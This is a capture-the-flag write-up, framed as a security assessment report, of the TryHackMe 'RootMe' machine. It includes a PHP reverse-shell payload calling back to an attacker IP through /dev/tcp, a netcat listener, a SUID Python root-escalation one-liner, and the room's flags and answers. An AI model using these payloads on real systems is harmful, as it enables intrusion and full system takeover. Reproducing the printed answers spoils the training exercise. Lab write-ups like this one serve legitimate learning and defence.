# Security Assessment Report – RootMe (TryHackMe)

**Analyst:** Felipe Campolina  
**Role:** Cybersecurity Analyst / Penetration Tester  
**Date:** September 2025  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Challenge URL:** https://tryhackme.com/room/rootme  

---

## Executive Summary

This report documents the compromise of the **RootMe** machine on TryHackMe.  
Key issues identified and exploited:  

- **Unrestricted File Upload:** Allowed arbitrary file execution.  
- **Hidden Directory Exposure:** `/panel/` contained upload functionality.  
- **Privilege Escalation via SUID:** Misconfigured `/usr/bin/python` enabled full root access.  

**Impact:** Complete system compromise including both user and root flags.  

---

## Objective

- Enumerate open ports and services.  
- Discover hidden directories.  
- Exploit insecure upload functionality to gain shell access.  
- Escalate privileges via SUID misconfiguration.  
- Retrieve both `user.txt` and `root.txt` flags.  

---

## Methodology

1. Reconnaissance with Nmap  
2. Directory enumeration with Gobuster  
3. Exploitation through file upload (webshell & reverse shell)  
4. Post-exploitation to retrieve `user.txt`  
5. Privilege escalation via SUID Python  
6. Retrieval of `root.txt`  

---

## Findings

### Reconnaissance

**Question:** *Scan the machine, how many ports are open?*  
**Answer:** 2  

**Question:** *What version of Apache is running?*  
**Answer:** 2.4.41  

**Question:** *What service is running on port 22?*  
**Answer:** ssh  

---

### Web Application Enumeration

**Question:** *What is the hidden directory?*  
**Answer:** /panel/  

---

### Exploitation – File Upload & Reverse Shell

**Question:** *Find a form to upload and get a reverse shell, and find the flag.*  
**Answer (user.txt):** THM{y0u_g0t_a_sh3ll}  

---

### Privilege Escalation

**Question:** *Search for files with SUID permission, which file is weird?*  
**Answer:** /usr/bin/python  

**Question:** *root.txt*  
**Answer:** THM{pr1v1l3g3_3sc4l4t10n}  

---

## Step-by-Step Walkthrough

### 1) Recon – Service & Version Detection
```bash
nmap -sC -sV -oN nmap_initial.txt 10.10.230.182
# Results:
# 22/tcp open  ssh (OpenSSH 8.2p1 Ubuntu)
# 80/tcp open  http (Apache 2.4.41)
```

### 2) Web Enumeration – Discover Directories
```bash
gobuster dir -u http://10.10.230.182 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
# Results:
# /index.php
# /panel/
# /uploads/
# /css/
# /js/
```

### 3) Exploitation – File Upload & Reverse Shell
Create reverse shell (`shell.phtml`):
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.3.44/4444 0>&1'"); ?>
```

Start listener:
```bash
nc -lvnp 4444
```

Upload file through `/panel/` and trigger:
```
http://10.10.230.182/uploads/shell.phtml
```

Shell obtained as `www-data`.

### 4) Post-Exploitation – User Flag
```bash
cat /var/www/user.txt
# THM{y0u_g0t_a_sh3ll}
```

### 5) Privilege Escalation – SUID Python
Check SUID files:
```bash
find / -user root -perm -4000 -exec ls -l {} \; 2>/dev/null | grep python
# -rwsr-xr-x 1 root root ... /usr/bin/python
```

Exploit to gain root:
```bash
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
# root
```

### 6) Root Flag
```bash
cat /root/root.txt
# THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Tools Used
- **nmap** – Service discovery and enumeration  
- **Gobuster** – Directory brute forcing  
- **Netcat** – Reverse shell listener  
- **Python** – Privilege escalation via SUID  

---

## Results
- **user.txt →** THM{y0u_g0t_a_sh3ll}  
- **root.txt →** THM{pr1v1l3g3_3sc4l4t10n}  

---

## Remediation Recommendations
1. **Fix File Upload Functionality**  
   - Validate file extensions and MIME types.  
   - Store uploads outside of the web root.  
   - Implement server-side filtering and monitoring.  

2. **Remove Dangerous SUID Binaries**  
   - `/usr/bin/python` should not have the SUID bit.  
   - Regularly audit all SUID binaries.  

3. **Patch and Harden the System**  
   - Keep Apache and OpenSSH updated.  
   - Remove unnecessary services and binaries.  

4. **Restrict Access to Sensitive Paths**  
   - Protect `/panel/` with authentication.  
   - Apply least privilege principle.  

---

## Conclusion & Lessons Learned
This challenge demonstrated a full attack chain from enumeration to root compromise.  

Key takeaways:
- Enumeration with `nmap` and `gobuster` is crucial to discover the attack surface.  
- File upload vulnerabilities can directly lead to remote code execution.  
- Misconfigured SUID binaries allow trivial privilege escalation to root.  

**Lesson:** Simple misconfigurations, when combined, can result in total system compromise.  
System hardening, patching, and secure coding practices are mandatory.  

---

## Challenge Rating
⭐⭐⭐ (Excellent for beginners in Web Exploitation and Linux Privilege Escalation)
